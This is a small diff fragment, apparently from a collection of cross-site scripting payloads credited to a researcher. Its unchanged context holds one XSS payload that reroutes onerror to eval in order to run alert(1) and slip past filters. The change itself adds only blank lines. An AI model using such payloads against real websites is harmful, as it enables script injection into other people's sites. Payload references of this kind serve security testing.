@@ -23,3 +23,5 @@ updated_at: '2023-04-10T20:21:31.907097+00:00'
 // From @cgvwzq
 <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
 ```
+
+
